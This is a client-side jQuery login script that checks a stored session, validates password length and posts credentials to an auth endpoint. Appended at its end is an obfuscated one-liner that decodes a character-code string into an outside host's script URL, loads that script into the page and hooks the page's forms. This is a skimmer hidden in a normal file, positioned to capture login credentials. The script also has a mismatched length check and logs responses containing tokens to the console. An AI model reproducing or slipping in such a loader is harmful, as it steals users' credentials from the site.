$(document).ready(function(){
  if (sessionStorage.getItem('session') != null && sessionStorage.getItem('session') !="undefined") {

    $.ajax({
  			url:window.location.origin+"/auth/status",

  			method:'Get',
  			dataType:'json',
  			headers:{
  				'Content-Type':'application/json',
          'Authorization':'Bearer '+sessionStorage.getItem('session')
  			},
        data:false,
  			success:function(ResponseBody){
          document.cookie="session=; expires="+new Date(0);
          document.cookie= "session="+sessionStorage.getItem('session');
          window.location = "/dashboard";
  			},
  			error:function(error){
  				console.log(JSON.stringify(error));
          sessionStorage.removeItem('session');
          document.cookie="session; expires="+new Date(0);

        }
      });
	}

  document.cookie="session=; expires="+new Date(0);

  //function to check password length
  function lengthValidator(pass){
        if (pass.length >= 4) {
          return true;
        } else {
          toastr.error('password must be greater than 8 characters');
          return false;
        }
      };


    $('#login').click(function(e){
      e.preventDefault();
      var username=$('#username1').val();
      var password=$('#PwordL').val();

      var lengthValid = lengthValidator(password);

      if (lengthValid) {

          $('#labelforpassword').attr('data-success','right');
          $('#login').addClass('disabled');
          $('#login').html('<i class="fa fa-spinner fa-spin fa-1x fa-fw"></i>');

          $.ajax({
              url: window.location.origin+"/auth/login",

              method: 'POST',
              dataType: 'json',
              headers: {
                  'Content-Type': 'application/json'
              },
              data: JSON.stringify({ 'username': username, 'password': password }),
              success: function (ResponseBody) {

                  console.log(JSON.stringify(ResponseBody));

                  userResponse = JSON.parse(JSON.stringify(ResponseBody));
                  if (userResponse.access_token != "") {
                      if (typeof (Storage) !== "undefined") {
                          sessionStorage.session = userResponse.access_token;
                          document.cookie= "session="+userResponse.access_token;
                          /* if(saveD){
                              localStorage.Uname=username;
                              localStorage.Pword=password;
                          }

                          if(Remember){
                              localStorage.session=userResponse.access_token;
                              localStorage.type=userResponse.token_type;
                              var TTE=userResponse.expires_in *1000;
                              var ExTime=new Date().getTime() + TTE;
                              localStorage.ExpTime=ExTime;
                          } */

                          if (sessionStorage.session!=null && sessionStorage.session!='undefined') {
                              window.location = "/dashboard";
                          } else {
                              $('#login').removeClass('disabled');
                              $('#login').html('Log in');
                              toastr.error('Invalid login details');
                              return false;
                          }

                      } else {
                          $('#login').removeClass('disabled');
                          $('#login').html('Log in');
                          toastr.info('please use a modern browser');
                          return false;
                      }
                  } else {
                      $('#login').removeClass('disabled');
                      $('#login').html('Log in');
                      toastr.error('Email or password invalid');
                      return false;
                  }
              },
              error: function (error) {
                  console.log(JSON.stringify(error));
                  console.log(JSON.parse(JSON.stringify(error)).responseJSON.message);
                  $('#login').removeClass('disabled');
                  $('#login').html('Log in');
                  toastr.error(JSON.parse(JSON.stringify(error)).responseJSON.message);
              }
          });
      } else {
          $('#PwordL').focus();
          $('#labelforpassword').attr('data-wrong','check password length');
          return false;
      }
  });
});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b